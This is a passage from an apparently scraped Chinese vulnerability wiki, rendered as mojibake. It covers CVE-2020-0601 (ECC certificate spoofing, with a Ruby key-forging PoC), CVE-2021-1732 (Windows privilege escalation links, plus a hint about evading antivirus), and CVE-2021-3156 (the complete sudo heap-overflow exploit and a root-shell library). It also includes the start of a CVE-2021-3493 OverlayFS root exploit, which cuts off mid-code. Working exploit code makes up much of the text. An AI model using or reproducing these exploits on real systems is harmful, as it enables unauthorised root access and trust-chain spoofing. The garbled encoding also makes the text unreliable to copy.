åœ¨æ¤­åœ†æ›²çº¿ä¸Šä»»æ„ä¸¤ç‚¹Aã€Bï¼ˆè‹¥Aã€Bé‡åˆåˆ™ä½œAçš„åˆ‡çº¿ï¼‰ï¼Œä½œç›´çº¿äº¤äºæ¤­åœ†æ›²çº¿å¦ä¸€ç‚¹Cï¼Œè¿‡Cåšyè½´çš„å¹³è¡Œçº¿ä¸æ¤­åœ†æ›²çº¿äº¤äºCç‚¹ï¼Œå®šä¹‰A+B=Cã€‚æ¤­åœ†æ›²çº¿çš„åŠ æ³•ç¬¦åˆäº¤æ¢å¾‹å’Œç»“åˆå¾‹ã€‚ å¦‚æœAã€Bæ˜¯åŒä¸€ä¸ªç‚¹ï¼Œåˆ™è¿‡Aä½œæ¤­åœ†æ›²çº¿çš„åˆ‡çº¿ï¼Œä»¥åŒæ ·çš„æ–¹æ³•å¾—åˆ°å¯¹åº”çš„ç»“æœ C=2A ã€‚ æ¥ä¸‹æ¥æ˜¯æ¤­åœ†æ›²çº¿åŠ å¯†ç›¸å…³çš„é‡ç‚¹ï¼Œå¦‚æœå¯¹å¤šä¸ªAè¿›è¡Œç´¯åŠ ,åˆ™å¯ä¾æ¬¡ç´¯åŠ è¿çº¿å¾—åˆ°nAçš„å€¼ ã€‚ èµ·ç‚¹ä¸ºAï¼Œç»ˆç‚¹D=3Aï¼Œé˜¶ä¸º3 ã€‚ èµ·ç‚¹ä¸ºAï¼Œç»ˆç‚¹G=4Aï¼Œé˜¶ä¸º4ã€‚ æ¤­åœ†æ›²çº¿åŠ å¯† è€ƒè™‘K=kGï¼Œå…¶ä¸­Kã€Gä¸ºæ¤­åœ†æ›²çº¿Ep(a,b)ä¸Šçš„ç‚¹ï¼Œnä¸ºGçš„é˜¶ã€‚kä¸ºå°äºnçš„æ•´æ•°ã€‚åˆ™ç»™å®škå’ŒGï¼Œæ ¹æ®åŠ æ³•æ³•åˆ™ï¼Œè®¡ç®—Kå¾ˆå®¹æ˜“ï¼ˆåªè¦é€æ¬¡æ±‚è§£ï¼‰ä½†åè¿‡æ¥ï¼Œç»™å®šKå’ŒGï¼Œæ±‚kå°±éå¸¸å›°éš¾ã€‚å› ä¸ºå®é™…ä½¿ç”¨ä¸­çš„ECCåŸåˆ™ä¸ŠæŠŠç§é’¥kå–å¾—ç›¸å½“å¤§ï¼Œnä¹Ÿç›¸å½“å¤§ï¼Œä¸”æ¤­åœ†æ›²çº¿ä¸å†è¿ç»­è€Œæ˜¯åœ¨å®æ•°å†…ç¦»æ•£çš„å€¼ï¼Œè¦æŠŠnä¸ªè§£ç‚¹é€ä¸€ç®—å‡ºå‡ ä¹æ˜¯ä¸å¯èƒ½çš„ã€‚è¿™å°±æ˜¯æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•çš„æ•°å­¦ä¾æ® ã€‚ ç‚¹Gç§°ä¸ºåŸºç‚¹ k(k Kä¸ºå…¬å¼€å¯†é’¥ æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼ˆECCï¼‰å’ŒRSAä¸€æ ·æ˜¯ä¸€ç§å…¬å¼€å¯†é’¥åŠ å¯†æŠ€æœ¯ï¼Œå¯¹åŸå§‹æ•°æ®ä»¥å…¬é’¥åŠ å¯†ï¼Œä»¥ç§é’¥è§£å¯†ï¼Œå³ä¾¿æ”»å‡»è€…è·å–å¯†æ–‡å’Œå…¬é’¥ä¹Ÿæ— æ³•ï¼ˆåœ¨åˆç†çš„æ—¶é—´æˆ–ä»£ä»·ä¸‹ï¼‰è§£å¯†è·å–æ˜æ–‡ã€‚ åŒæ ·çš„ï¼Œæ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼ˆECCï¼‰ä¹Ÿè¢«ç”¨äºæ•°å­—ç­¾åï¼Œä»¥ç§é’¥åŠ å¯†ç”Ÿæˆç­¾åï¼Œä»¥å…¬é’¥è§£å¯†éªŒè¯ç­¾åï¼Œå¦‚æœå’ŒåŸæ–‡ä¸€æ ·åˆ™ç­¾åéªŒè¯æˆåŠŸã€‚ å…¬å¼€å¯†é’¥åŠ å¯†ä¹‹æ‰€ä»¥å¯é æ˜¯å› ä¸ºå®ƒä»¬åˆ©ç”¨äº†å…¬é’¥å¯†ç é¢†åŸŸçš„å•å‘å‡½æ•°åŸç†ï¼Œæ­£å‘æ“ä½œéå¸¸ç®€å•ï¼Œè€Œé€†å‘æ“ä½œéå¸¸å›°éš¾ã€‚ ç”±Gï¼ˆåŸºç‚¹ï¼‰å‡ºå‘ï¼Œè¿›è¡Œkï¼ˆç§é’¥ï¼‰æ¬¡å˜æ¢ï¼Œåªè¦æŒ‰éƒ¨å°±ç­åœ°è®¡ç®—ï¼Œå°±èƒ½å¾ˆå®¹æ˜“åœ°å¾—åˆ°ç»ˆç‚¹Kï¼ˆå…¬é’¥ï¼‰çš„å€¼ã€‚ å·²çŸ¥èµ·ç‚¹Gï¼ˆåŸºç‚¹ï¼‰å’Œç»ˆç‚¹Kï¼ˆå…¬é’¥ï¼‰ï¼Œè¦é€†æ¨å¾—åˆ°ç§»åŠ¨æ¬¡æ•°kï¼ˆç§é’¥ï¼‰åˆ™æ˜¯ä¸€ä¸ªå¾ˆéš¾çš„é—®é¢˜ï¼ˆæœ€ä½³ç®—æ³•ä¹Ÿè¾¾åˆ°äº†å…¨æŒ‡æ•°å¤æ‚åº¦ï¼‰ ç›¸æ¯”ä¼ ç»ŸRSAåŠ å¯†ç®—æ³•ï¼Œæ¤­åœ†åŠ å¯†ç®—æ³•å…·æœ‰ç€å¤©ç”Ÿçš„ä¼˜åŠ¿ï¼Œæ¤­åœ†åŠ å¯†ç®—æ³•çš„é€†å‘è¿‡ç¨‹ç›¸æ¯”RSAæœ‰ç€æ›´å¤§çš„æ—¶é—´å¤æ‚åº¦ã€‚åœ¨å¯†é’¥é•¿åº¦ç›¸åŒçš„æƒ…å†µä¸‹ï¼Œæ¤­åœ†åŠ å¯†ç®—æ³•ç›¸æ¯”RSAå…·æœ‰æ›´å¥½çš„å®‰å…¨å¼ºåº¦ã€‚ä¸€èˆ¬è®¤ä¸ºï¼Œ160æ¯”ç‰¹çš„æ¤­åœ†æ›²çº¿å¯†é’¥å³å¯æä¾›ä¸1024æ¯”ç‰¹çš„RSAå¯†é’¥ç›¸å½“çš„å®‰å…¨å¼ºåº¦ã€‚ è¾ƒçŸ­çš„å¯†é’¥ä¹Ÿæ„å‘³ç€æ›´å°‘çš„å­˜å‚¨ç©ºé—´ã€æ›´å¿«çš„åŠ è§£å¯†é€Ÿåº¦å’Œæ›´å°‘çš„å¸¦å®½æ¶ˆè€—ï¼Œæ­£å› ä¸ºæ¤­åœ†åŠ å¯†ç®—æ³•çš„è¿™äº›ä¼˜åŠ¿ï¼Œå®ƒè¢«ç”¨äºWindowsçš„ç­¾åç³»ç»Ÿã€httpsçš„è¯ä¹¦ã€æ¯”ç‰¹å¸ç³»ç»Ÿå’Œä¸­å›½çš„äºŒä»£èº«ä»½è¯ç³»ç»Ÿä¸­ã€‚ è™½ç„¶æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•å…·æœ‰ç€è®¸å¤šä¼˜åŠ¿ï¼Œçº¯ç®—æ³•è§’åº¦ç ´è§£éš¾åº¦æå¤§ï¼Œå¾®è½¯å¯¹æ­¤ç®—æ³•çš„å®ç°çš„ç¼ºæ¼å´ç»™æ¼æ´åˆ©ç”¨æä¾›äº†å¯ä¹˜ä¹‹æœºã€‚å›åˆ°æ¤­åœ†æ›²çº¿åŠ å¯†æœ€åŸºæœ¬çš„ç­‰å¼ K=kGï¼Œé¦–å…ˆéœ€è¦æ˜ç¡®çš„æ˜¯ï¼Œè™½ç„¶å¯¹äºç»™å®šçš„åŸºç‚¹Gå’Œå…¬é’¥Kï¼Œè¦æ±‚è§£ç§é’¥kå¾ˆå›°éš¾ï¼Œä½†æ˜¯å¦‚æœå¯ä»¥ä»»æ„æŒ‡å®šåŸºç‚¹Gï¼Œè¦æ„é€ ä¸€å¯¹kå’ŒGä½¿ç­‰å¼æˆç«‹å´æå…¶ç®€å•ï¼›æœ€ç®€å•çš„æƒ…å†µï¼Œä»¤åŸºç‚¹G=Kï¼Œåˆ™ç§é’¥k=1ï¼Œè¿™æ ·ä¸€å¯¹åŸºç‚¹å’Œç§é’¥å¯ä»¥ä½¿ç­‰å¼æˆç«‹ï¼Œä¹Ÿæ˜¯æœ‰æ•ˆçš„è§£ã€‚ åœ¨æ­£å¸¸çš„æ ‡å‡†æ¤­åœ†æ›²çº¿ç®—æ³•ä¸­ï¼ŒåŸºç‚¹Gå¹¶ä¸æ˜¯éšæ„æŒ‡å®šçš„ï¼Œè€Œæ˜¯æœ‰å›ºå®šçš„å€¼ï¼ˆæ ‡å‡†çš„ä½œç”¨ï¼Œä¾¿æ˜¯å¯¹åŸºç‚¹Gç­‰å‚æ•°çš„é€‰æ‹©åšå‡ºè§„å®šï¼‰ï¼Œä¾‹å¦‚åœ¨secp256r1ç‰ˆæœ¬çš„æ¤­åœ†æ›²çº¿ç®—æ³•ä¸­ï¼ŒåŸºç‚¹Gåº”å½“ä¸ºæ ‡å‡†è§„å®šçš„å›ºå®šå€¼ï¼Œå¦‚æœå¯¹å‚æ•°ä¸åŠ éªŒè¯ï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰ä¼ å…¥çš„åŸºç‚¹Gçš„å€¼ï¼ˆä½œä¸ºå‡½æ•°çš„å‚æ•°ï¼‰ï¼Œä¸Šé¢çš„ç§é’¥k=1çš„ç‰¹æ®Šè§£å³å¯æˆç«‹ã€‚ åœ¨æœ‰æ¼æ´ç‰ˆæœ¬çš„crypt32.dllä¸­éªŒè¯ä½¿ç”¨ECCç®—æ³•ç­¾åéƒ¨åˆ†çš„å‡½æ•°æ°æ°æ˜¯è¿™ä¸ªæƒ…å†µï¼ŒåŸå…ˆçš„å‡½æ•°æœªåŠ å‚æ•°éªŒè¯ï¼Œå‚ä¸è®¡ç®—çš„åŸºç‚¹Gçš„å†…å®¹ç”±è¢«éªŒè¯çš„è¯ä¹¦éšæ„æŒ‡å®šï¼Œä½¿æœªæˆæƒçš„è¯ä¹¦èƒ½å¤Ÿæ„å»ºç§é’¥k=1çš„ç‰¹æ®Šè§£æ¥æˆåŠŸé€šè¿‡æ¤­åœ†åŠ å¯†ç®—æ³•çš„ç­¾åéªŒè¯çš„è¿‡ç¨‹ã€‚ è®©æˆ‘ä»¬ä»¥CVE-2020-0601çš„ä¸€ä¸ªPOCä¸ºä¾‹æ¥è§£æè™šå‡å¯†é’¥çš„æ„å»ºè¿‡ç¨‹ï¼š require 'openssl' raw = File.read ARGV[0] # è¯»å–ä½¿ç”¨ECCç®—æ³•çš„è¯ä¹¦æ–‡ä»¶ ca = OpenSSL::X509::Certificate.new(raw) # è¯»å–ä½¿ç”¨ECCç®—æ³•çš„è¯ä¹¦ ca_key = ca.public_key # ä»è¯ä¹¦ä¸­æå–å…¬é’¥ca_key ca_key.private_key = 1 # è®¾ç½®ç§é’¥ä¸º1ï¼Œä½¿å¾—å…¬é’¥K==1*åŸºç‚¹Gçš„ç­‰å¼æˆç«‹ group = ca_key.group group.set_generator(ca_key.public_key, group.order, group.cofactor) group.asn1_flag = OpenSSL::PKey::EC::EXPLICIT_CURVE ca_key.group = group # åˆ©ç”¨æ„å»ºçš„å‡åŸºç‚¹Gå’Œå‡å¯†é’¥kè®¾ç½®æ–°group File.open(\"spoofed_ca.key\", 'w') { |f| f.write ca_key.to_pem } # å°†æ–°çš„groupå†™å…¥æ–‡ä»¶ ä¿®è¡¥åçš„Crypt32.dllä¸­æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•çš„å‡½æ•°å·²åŠ å…¥äº†å‚æ•°éªŒè¯çš„éƒ¨åˆ†ï¼Œè§£å†³äº†ç”±è‡ªç”±æŒ‡å®šå‚æ•°Gå¯¼è‡´çš„æ„é€ ç¬¬äºŒä¸ªç‰¹æ®Šçš„æœ‰æ•ˆå¯†é’¥çš„é—®é¢˜ã€‚ ä¸€å¤„éªŒè¯æœºåˆ¶çš„å¤±è¯¯å¯¼è‡´ä¿¡ä»»é“¾çš„è¿é”ååº”ã€‚ ç°ä»£çš„å®‰å…¨ç³»ç»Ÿä¸­å­˜åœ¨ç€â€œä¿¡ä»»é“¾â€çš„æ¦‚å¿µï¼Œä¿¡ä»»é“¾çš„ä¸Šä¸‹çº§å­˜åœ¨ä¸€ç§ç±»ä¼¼å•å‘æ‹…ä¿çš„å…³ç³»ï¼Œå­çº§è¯ä¹¦çš„å¯é æ€§ç”±ç­¾åå…¶çš„çˆ¶çº§è¯ä¹¦æ‹…ä¿ã€‚ç­¾åæ—¶ç”±æ ¹è¯ä¹¦å¼€å§‹ä¸€çº§çº§å‘ä¸‹ç­¾åï¼ŒéªŒè¯æ—¶åˆ™é€å±‚æº¯æºéªŒè¯ï¼Œç›´åˆ°æ‰¾åˆ°ä¿¡ä»»çš„æ ¹è¯ä¹¦æ–‡ä»¶ï¼Œæ„æˆäº†ä¸€æ¡ä¿¡ä»»é“¾ã€‚ä½äºæ•´ä¸ªâ€œä¿¡ä»»é“¾â€æœ€ä¸Šæ–¹çš„æ˜¯æœ€ä¸ºé‡è¦ä¸éœ€è¦è‡ªè¯èº«ä»½çš„æ ¹è¯ä¹¦ã€‚æ ¹è¯ä¹¦ä¸€èˆ¬éšç³»ç»Ÿé™„å¸¦æˆ–ç”±ç®¡ç†å‘˜å®‰è£…åœ¨ç³»ç»Ÿå†…ã€‚ è¿™ä¸ªæ¼æ´çš„å­˜åœ¨åˆ™ä½¿å¾—æ„é€ çš„æ— æ•ˆç­¾åé€šè¿‡äº†éªŒè¯æœºåˆ¶ï¼Œä½¿æœ¬åº”æ–­è£‚çš„ä¿¡ä»»é“¾è¢«åˆ©ç”¨ï¼Œé€çº§æ‹…ä¿ç»§ç»­ä¸‹å»ï¼Œæœ€ç»ˆä½¿éæ³•å†…å®¹è·å¾—äº†è¯ä¹¦æ‰€æœ‰è€…çš„åˆæ³•ç­¾åèº«ä»½ã€‚ æ¼æ´åˆ©ç”¨ https://github.com/ollypwn/CurveBall å‚è€ƒæ–‡ç«  cve-2020-0601-windows-cryptoapiæ¬ºéª—æ¼æ´åˆ†æ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Windows Win32k æœ¬åœ°ææƒæ¼æ´ CVE-2021-1732.html":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Windows Win32k æœ¬åœ°ææƒæ¼æ´ CVE-2021-1732.html","title":"Windows Win32k æœ¬åœ°ææƒæ¼æ´ CVE-2021-1732","keywords":"","body":"Windows Win32k æœ¬åœ°ææƒæ¼æ´ CVE-2021-1732 æ¼æ´æè¿° 2021å¹´2æœˆ10æ—¥ï¼Œå¾®è½¯æ¯æœˆçš„ä¾‹è¡Œè¡¥ä¸åŒ…ä¸­ä¿®å¤äº†ä¸€ä¸ªWindowsç³»ç»Ÿæœ¬åœ°ææƒæ¼æ´ï¼Œæœ¬åœ°æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æå‡åˆ°systemæƒé™ï¼Œæ®ç§°æ­¤æ¼æ´è¢«ç”¨äºå®šå‘æ”»å‡»æ´»åŠ¨ã€‚ å¥‡å®‰ä¿¡æ¯å¨èƒæƒ…æŠ¥ä¸­å¿ƒçº¢é›¨æ»´å›¢é˜Ÿç¬¬ä¸€æ—¶é—´è·Ÿè¿›è¯¥æ¼æ´å¹¶ç¡®è®¤å…¶å¯ç”¨æ€§ï¼Œæ¼æ´ç›¸åº”çš„åˆ©ç”¨ç¨‹åºå·²ç»å…¬å¼€ï¼Œæœ‰å¯èƒ½è¢«æ”¹é€ æ¥æ‰§è¡Œå¤§èŒƒå›´çš„æ”»å‡»ï¼Œå·²ç»æ„æˆç°å®çš„å¨èƒã€‚ç›®å‰å¾®è½¯å·²ç»ä¿®è¡¥äº†æ­¤æ¼æ´ï¼Œå¥‡å®‰ä¿¡æ¯å¨èƒæƒ…æŠ¥ä¸­å¿ƒæé†’ç›¸å…³ç”¨æˆ·åŠæ—¶å®‰è£…2æœˆè¡¥ä¸ã€‚ æ¼æ´å½±å“ [!NOTE] Windows Server, version 20H2 (Server Core Installation) Windows 10 Version 20H2 for ARM64-based Systems Windows 10 Version 20H2 for 32-bit Systems Windows 10 Version 20H2 for x64-based Systems Windows Server, version 2004 (Server Core installation) Windows 10 Version 2004 for x64-based Systems Windows 10 Version 2004 for ARM64-based Systems Windows 10 Version 2004 for 32-bit Systems Windows Server, version 1909 (Server Core installation) Windows 10 Version 1909 for ARM64-based Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for 32-bit Systems Windows Server 2019 (Server Core installation) Windows Server 2019 Windows 10 Version 1809 for ARM64-based Systems Windows 10 Version 1809 for x64-based Systems Windows 10 Version 1809 for 32-bit Systems Windows 10 Version 1803 for ARM64-based Systems Windows 10 Version 1803 for x64-based Systems æ¼æ´å¤ç° è¿™é‡Œä½¿ç”¨è…¾è®¯äº‘çš„Windows 2019 Server æ­å»ºç¯å¢ƒ ç›®å‰EXPå·²ç»å…¬å¼€äº† [!NOTE] å…¬ä¼—å·å‘é€ CVE-2021-1732 å¯ä»¥è·å–ç¼–è¯‘å¥½çš„ EXP Githubå…¬å¼€åœ°å€:https://github.com/KaLendsi/CVE-2021-1732-Exploit å‰å®³çš„å¸ˆå‚…å¯ä»¥åšä¸€ä¸‹å…æ€ï¼Œç°åœ¨ä¸€ä¸Šä¼ å°±ä¼šè¢«æ€äº† ä¸Šä¼ åˆ°æœåŠ¡å™¨è¿è¡Œ, æ­¤æ—¶æ˜¯ä»¥Systemæƒé™è¿è¡Œ [!NOTE] æœ‰è“å±æ¦‚ç‡ï¼Œä½¿ç”¨è°¨æ…ç‚¹æ’’ CVE-2021-1723 whoami å‚è€ƒæ–‡ç«  https://mp.weixin.qq.com/s/Ato-oKmNeyziXkKCr8d4kg PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Linux/":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Linux/","title":"Linux","keywords":"","body":"Linux Linux sudoæƒé™æå‡æ¼æ´ CVE-2021-3156 Linux kernelæƒé™æå‡æ¼æ´ CVE-2021-3493 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-21 17:21:19 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Linux/Linux sudoæƒé™æå‡æ¼æ´ CVE-2021-3156.html":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Linux/Linux sudoæƒé™æå‡æ¼æ´ CVE-2021-3156.html","title":"Linux sudoæƒé™æå‡æ¼æ´ CVE-2021-3156","keywords":"","body":"Linux sudoæƒé™æå‡æ¼æ´ CVE-2021-3156 æ¼æ´æè¿° 2021å¹´1æœˆ26æ—¥ï¼ŒLinuxå®‰å…¨å·¥å…·sudoè¢«å‘ç°ä¸¥é‡çš„åŸºäºå †ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼Œæ”»å‡»è€…æ— éœ€çŸ¥é“ç”¨æˆ·å¯†ç ï¼Œä¸€æ ·å¯ä»¥è·å¾—rootæƒé™ï¼Œå¹¶ä¸”æ˜¯åœ¨é»˜è®¤é…ç½®ä¸‹ã€‚æ­¤æ¼æ´å·²åˆ†é…ä¸ºCVE-2021-3156ï¼Œå±é™©ç­‰çº§è¯„åˆ†ä¸º7åˆ†ã€‚ å½“sudoé€šè¿‡-sæˆ–-iå‘½ä»¤è¡Œé€‰é¡¹åœ¨shellæ¨¡å¼ä¸‹è¿è¡Œå‘½ä»¤æ—¶ï¼Œå®ƒå°†åœ¨å‘½ä»¤å‚æ•°ä¸­ä½¿ç”¨åæ–œæ è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ã€‚ä½†ä½¿ç”¨-sæˆ–-iæ ‡å¿—è¿è¡Œsudoeditæ—¶ï¼Œå®é™…ä¸Šå¹¶æœªè¿›è¡Œè½¬ä¹‰ï¼Œä»è€Œå¯èƒ½å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºã€‚å› æ­¤åªè¦å­˜åœ¨sudoersæ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯/etc/sudoersï¼‰ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨æœ¬åœ°æ™®é€šç”¨æˆ·åˆ©ç”¨sudoè·å¾—ç³»ç»Ÿrootæƒé™ã€‚ç ”ç©¶äººå‘˜åˆ©ç”¨è¯¥æ¼æ´åœ¨å¤šä¸ªLinuxå‘è¡Œç‰ˆä¸ŠæˆåŠŸè·å¾—äº†å®Œæ•´çš„rootæƒé™ï¼ŒåŒ…æ‹¬Ubuntu 20.04ï¼ˆsudo 1.8.31ï¼‰ã€Debian 10ï¼ˆsudo 1.8.27ï¼‰å’ŒFedora 33ï¼ˆsudo 1.9.2ï¼‰ï¼Œå¹¶ä¸”sudoæ”¯æŒçš„å…¶ä»–æ“ä½œç³»ç»Ÿå’ŒLinuxå‘è¡Œç‰ˆä¹Ÿå¾ˆå®¹æ˜“å—åˆ°æ”»å‡»ã€‚ æ¼æ´å½±å“ Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 æ¼æ´å¤ç° [!NOTE] ç›®å‰POCå·²ç»åœ¨Githubå…¬å¼€ Linux sudoæƒé™æå‡æ¼æ´ CVE-2021-3156 å½“å‰å¯ä»¥éªŒè¯çš„Linuxç¯å¢ƒä¸º Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28 [!NOTE] è¿™é‡Œä½¿ç”¨è…¾è®¯äº‘ä¸­çš„Ubuntué•œåƒè¿›è¡Œå¤ç° ä½¿ç”¨å‘½ä»¤ æ¼æ´åˆ©ç”¨POC [!NOTE] POCç›®å½•å·²ç»åŠ å…¥æ¼æ´åˆ©ç”¨ä»£ç  å¦ä¸€ä¸ªæ— äº¤äº’å¼shellä½¿ç”¨çš„è„šæœ¬ https://github.com/Rvn0xsy/CVE-2021-3156-plus Makefile all: rm -rf libnss_X mkdir libnss_X gcc -o sudo-hax-me-a-sandwich hax.c gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c clean: rm -rf libnss_X sudo-hax-me-a-sandwich hax.c /** ** CVE-2021-3156 PoC by blasty ** =========================================== ** ** Exploit for that sudo heap overflow thing everyone is talking about. ** This one aims for singleshot. Does not fuck with your system files. ** No warranties. ** ** Shout outs to: ** Qualys - for pumping out the awesome bugs ** lockedbyte - for coop hax. (shared tmux gdb sessions ftw) ** dsc - for letting me rack up his electricity bill ** my wife - for all the quality time we had to skip ** ** Enjoy! ** ** -- blasty // 20210130 **/ #include #include #include #include #include #include // 512 environment variables should be enough for everyone #define MAX_ENVP 512 typedef struct { char *target_name; char *sudoedit_path; uint32_t smash_len_a; uint32_t smash_len_b; uint32_t null_stomp_len; uint32_t lc_all_len; } target_t; target_t targets[] = { { .target_name = \"Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31\", .sudoedit_path = \"/usr/bin/sudoedit\", .smash_len_a = 56, .smash_len_b = 54, .null_stomp_len = 63, .lc_all_len = 212 }, { .target_name = \"Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28\", .sudoedit_path = \"/usr/bin/sudoedit\", .smash_len_a = 64, .smash_len_b = 49, .null_stomp_len = 60, .lc_all_len = 214 } }; void usage(char *prog) { printf(\" usage: %s \\n\\n\", prog); printf(\" available targets:\\n\"); printf(\" ------------------------------------------------------------\\n\"); for(int i = 0; i \\n\\n\"); if (argc != 2) { usage(argv[0]); return -1; } target_t *target = &targets[ atoi(argv[1]) ]; printf(\"using target: '%s'\\n\", target->target_name); char *smash_a = calloc(target->smash_len_a + 2, 1); char *smash_b = calloc(target->smash_len_b + 2, 1); memset(smash_a, 'A', target->smash_len_a); memset(smash_b, 'B', target->smash_len_b); smash_a[target->smash_len_a] = '\\\\'; smash_b[target->smash_len_b] = '\\\\'; char *s_argv[]={ \"sudoedit\", \"-s\", smash_a, \"\\\\\", smash_b, NULL }; char *s_envp[MAX_ENVP]; int envp_pos = 0; for(int i = 0; i null_stomp_len; i++) { s_envp[envp_pos++] = \"\\\\\"; } s_envp[envp_pos++] = \"X/P0P_SH3LLZ_\"; char *lc_all = calloc(target->lc_all_len + 16, 1); strcpy(lc_all, \"LC_ALL=C.UTF-8@\"); memset(lc_all+15, 'C', target->lc_all_len); s_envp[envp_pos++] = lc_all; s_envp[envp_pos++] = NULL; printf(\"** pray for your rootshell.. **\\n\"); execve(target->sudoedit_path, s_argv, s_envp); return 0; } lib.c #include #include #include #include static void __attribute__ ((constructor)) _init(void); static void _init(void) { printf(\"[+] bl1ng bl1ng! We got it!\\n\"); setuid(0); seteuid(0); setgid(0); setegid(0); static char *a_argv[] = { \"sh\", NULL }; static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL }; execv(\"/bin/sh\", a_argv); } PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Linux/Linux kernelæƒé™æå‡æ¼æ´ CVE-2021-3493.html":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Linux/Linux kernelæƒé™æå‡æ¼æ´ CVE-2021-3493.html","title":"Linux kernelæƒé™æå‡æ¼æ´ CVE-2021-3493","keywords":"","body":"Linux kernelæƒé™æå‡æ¼æ´ CVE-2021-3493 æ¼æ´æè¿° Ubuntu OverlayFS Local Privesc CVE-2021-3493 EXPåœ¨Githubè¢«å…¬å¼€ï¼Œå¯ä»¥é€šè¿‡EXPåœ¨Ubuntuå¤šä¸ªå½±å“ç³»ç»Ÿä¸­æå‡ ROOTæƒé™ æ¼æ´å½±å“ [!NOTE] Ubuntu 20.10 Ubuntu 20.04 LTS Ubuntu 18.04 LTS Ubuntu 16.04 LTS Ubuntu 14.04 ESM æ¼æ´å¤ç° æ¼æ´Githubåœ°å€ä¸ºï¼š https://github.com/briskets/CVE-2021-3493 ç¯å¢ƒä½¿ç”¨è…¾è®¯äº‘çš„Ubuntué•œåƒå³å¯ gcc exploit.c -o exploit chmod +x exploit ./exploit ä¸‹è½½å¹¶ç¼–è¯‘è„šæœ¬ è¿è¡ŒEXPæˆåŠŸææƒ Root æ¼æ´POC #define _GNU_SOURCE #include #include #include #include #include #include #include #include #include #include #include #include //#include //#include int setxattr(const char *path, const char *name, const void *value, size_t size, int flags); #define DIR_BASE \"./ovlcap\" #define DIR_WORK DIR_BASE \"/work\" #define DIR_LOWER DIR_BASE \"/lower\" #define DIR_UPPER DIR_BASE \"/upper\" #define DIR_MERGE DIR_BASE \"/merge\" #define BIN_MERGE DIR_MERGE \"/magic\" #define BIN_UPPER DIR_UPPER \"/magic\" static void xmkdir(const char *path, mode_t mode) { if (mkdir(path, mode) == -1 && errno != EEXIST) err(1, \"mkdir %s\", path); } static void xwritefile(const char *path, const char *data) { int fd = open(path, O_WRONLY); if (fd == -1) err(1, \"open %s\", path); ssize_t len = (ssize_t) strlen(data); if (write(fd, data, len) != len) err(1, \"write %s\", path); close(fd); } static void xcopyfile(const char *src, const char *dst, mode_t mode) { int fi, fo; if ((fi = open(src, O_RDONLY)) == -1) err(1, \"open %s\", src); if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1) err(1, \"open %s\", dst); char buf[4096]; ssize_t rd, wr; for (;;) { rd = read(fi, buf, sizeof(buf)); if (rd == 0) { break; } else if (rd == -1) { if (errno == EINTR) continue; err(1, \"read %s\", src); } char *p = buf; while (rd > 0) { wr = write(fo, p, rd); if (wr == -1) { if (errno == EINTR) continue; err(1, \"write %s\", dst); } p += wr; rd -= wr; } } close(fi); close(fo); } static int exploit() { char buf[4096]; sprintf(buf, \"rm -rf '%s/'\", DIR_BASE); system(buf); xmkdir(DIR_BASE, 0777); xmkdir(DIR_WORK, 0777); xmkdir(DIR_LOWER, 0777); xmkdir(DIR_UPPER, 0777); xmkdir(DIR_MERGE, 0777); uid_t uid = getuid(); gid_t gid = getgid(); if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1) err(1, \"unshare\"); xwritefile(\"/proc/self/setgroups\", \"deny\"); sprintf(buf, \"0 %d 1\", uid); xwritefile(\"/proc/self/uid_map\", buf); sprintf(buf, \"0 %d 1\", gid); xwritefile(\"/proc/self/gid_map\", buf); sprintf(buf, \"lowerdir=%s,upperdir=%s,workdir=%s\", DIR_LOWER, DIR_UPPER, DIR_WORK); if (mount(\"overlay\", DIR_MERGE, \"overlay\", 0, buf) == -1) err(1, \"mount %s\", DIR_MERGE); // all+ep char cap[] = \"\\x01\\x00\\x00\\x02\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\"; xcopyfile(\"/proc/self/exe\", BIN_MERGE, 0777); if (setxattr(BIN_MERGE, 